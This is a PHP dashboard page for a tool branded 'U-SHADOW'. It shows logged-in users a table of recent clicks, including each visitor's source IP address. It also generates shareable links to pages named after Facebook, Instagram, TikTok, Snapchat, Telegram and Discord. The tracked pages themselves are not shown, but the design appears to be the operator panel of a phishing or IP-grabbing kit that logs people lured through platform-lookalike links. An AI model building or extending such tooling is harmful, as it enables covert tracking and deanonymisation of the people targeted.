<?php
require_once __DIR__ . '/../config.php';
if (!isset($_SESSION['user'])) {
    header('Location: index.php');
    exit;
}
$user = $_SESSION['user'];

$analytics_data = json_decode(file_get_contents(ANALYTICS_FILE), true);
$user_analytics = array_filter($analytics_data, function($v) use ($user) {
    return $v['user_id'] === $user['username'];
});
$clicks_count = count($user_analytics);
$categories = json_decode(file_get_contents(CATEGORIES_FILE), true);

// Group analytics by category for stats
$cat_stats = [];
foreach ($user_analytics as $click) {
    $cat = $click['category'];
    $cat_stats[$cat] = ($cat_stats[$cat] ?? 0) + 1;
}
$top_hub = empty($cat_stats) ? 'N/A' : array_keys($cat_stats, max($cat_stats))[0];
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>U-shadow | Dashboard</title>
    <link rel="stylesheet" href="style.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
</head>
<body>

    <!-- Sidebar -->
    <aside class="sidebar">
        <div class="sidebar-brand">U-SHADOW</div>
        <ul class="sidebar-menu">
            <li><a href="dashboard.php" class="active"><i class="fa-solid fa-layer-group"></i> <span>Overview</span></a></li>
            <li><a href="#hubs"><i class="fa-solid fa-link"></i> <span>Integration Hubs</span></a></li>
            <li><a href="#analytics"><i class="fa-solid fa-chart-line"></i> <span>Analytics</span></a></li>
            <?php if (isset($user['is_admin']) && $user['is_admin']): ?>
                <li><a href="admin_categories.php"><i class="fa-solid fa-shield-halved"></i> <span>Admin Access</span></a></li>
            <?php endif; ?>
            <li style="margin-top: 100px;"><a href="logout.php"><i class="fa-solid fa-right-from-bracket"></i> <span>Sign Out</span></a></li>
        </ul>
    </aside>

    <!-- Main Content -->
    <main class="main-content">
        <header class="top-bar">
            <div class="page-title">
                <h1>Dashboard Overview</h1>
            </div>
            <div class="user-nav">
                <div class="user-info">
                    <span class="name"><?php echo s($user['username']); ?></span>
                    <span class="role"><?php echo (isset($user['is_admin']) && $user['is_admin']) ? 'Administrator' : 'Professional Member'; ?></span>
                </div>
                <div class="avatar"><?php echo strtoupper(substr($user['username'], 0, 1)); ?></div>
            </div>
        </header>

        <section class="stats-container">
            <div class="card-stat">
                <div class="label">Total Clicks</div>
                <div class="value"><?php echo $clicks_count; ?></div>
                <div class="trend up"><i class="fa-solid fa-arrow-trend-up"></i> +Live Activity</div>
            </div>
            <div class="card-stat">
                <div class="label">Active Hubs</div>
                <div class="value"><?php echo count($categories); ?></div>
                <div class="trend"><i class="fa-solid fa-check-circle"></i> Monitoring Active</div>
            </div>
            <div class="card-stat">
                <div class="label">Top Performance</div>
                <div class="value"><?php echo s(ucfirst($top_hub)); ?></div>
                <div class="trend up"><i class="fa-solid fa-fire"></i> Trending Hub</div>
            </div>
        </section>

        <section id="analytics" class="section">
            <div class="section-header">
                <h2>Real-time Click Analytics</h2>
            </div>
            <div class="section-content">
                <table class="custom-table">
                    <thead>
                        <tr>
                            <th>Timestamp</th>
                            <th>Platform Hub</th>
                            <th>Source IP Address</th>
                            <th>Recording Status</th>
                        </tr>
                    </thead>
                    <tbody>
                        <?php if ($clicks_count > 0): ?>
                            <?php foreach (array_reverse(array_slice($user_analytics, -10)) as $click): ?>
                                <tr>
                                    <td><i class="fa-regular fa-clock" style="color: var(--gray); margin-right: 8px;"></i> <?php echo s($click['timestamp']); ?></td>
                                    <td><strong class="text-primary"><?php echo s(ucfirst($click['category'])); ?></strong></td>
                                    <td><code><?php echo s($click['source_ip']); ?></code></td>
                                    <td><span class="badge badge-success">Success</span></td>
                                </tr>
                            <?php endforeach; ?>
                        <?php else: ?>
                            <tr>
                                <td colspan="4" style="text-align: center; color: var(--gray); padding: 50px;">No analytics recorded yet. Copy your links below to start tracking.</td>
                            </tr>
                        <?php endif; ?>
                    </tbody>
                </table>
            </div>
        </section>

        <section id="hubs" class="section">
            <div class="section-header">
                <h2>Your Integration Links</h2>
            </div>
            <div class="section-content">
                <div class="link-grid">
                    <?php
                    $icons = [
                        'facebook' => 'fa-brands fa-facebook',
                        'instagram' => 'fa-brands fa-instagram',
                        'tiktok' => 'fa-brands fa-tiktok',
                        'snapchat' => 'fa-brands fa-snapchat',
                        'telegram' => 'fa-brands fa-telegram',
                        'discord' => 'fa-brands fa-discord'
                    ];
                    foreach ($categories as $cat):
                        $cat_lower = strtolower($cat);
                        $icon_class = $icons[$cat_lower] ?? 'fa-solid fa-link';
                        $generated_link = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]/" . $cat_lower . ".php?user=" . urlencode($user['username']);
                    ?>
                        <div class="link-item">
                            <div class="platform">
                                <i class="<?php echo $icon_class; ?>"></i>
                                <span><?php echo s($cat); ?> Integration</span>
                            </div>
                            <div class="copy-box">
                                <input type="text" value="<?php echo s($generated_link); ?>" id="link-<?php echo $cat_lower; ?>" readonly>
                                <button onclick="copyLink('link-<?php echo $cat_lower; ?>')">COPY</button>
                            </div>
                            <div style="margin-top: 15px; font-size: 11px; color: var(--gray); display: flex; justify-content: space-between;">
                                <span>Total: <?php echo $cat_stats[$cat_lower] ?? 0; ?> clicks</span>
                                <span><i class="fa-solid fa-shield-halved"></i> Active</span>
                            </div>
                        </div>
                    <?php endforeach; ?>
                </div>
            </div>
        </section>
    </main>

    <footer>
        &copy; 2010-2025 | <strong>U-SHADOW Professional v3.5</strong> | All Rights Reserved. <br>
        <a href="terms.php" style="color: #888; text-decoration: none;">Terms of Service</a> |
        <a href="privacy.php" style="color: #888; text-decoration: none;">Privacy Policy</a>
    </footer>

    <script>
        function copyLink(id) {
            var copyText = document.getElementById(id);
            copyText.select();
            copyText.setSelectionRange(0, 99999);
            navigator.clipboard.writeText(copyText.value);

            var btn = copyText.nextElementSibling;
            var originalText = btn.innerHTML;
            btn.innerHTML = "DONE!";
            btn.style.background = "#10b981";
            setTimeout(function() {
                btn.innerHTML = originalText;
                btn.style.background = "#4361ee";
            }, 1500);
        }
    </script>
</body>
</html>
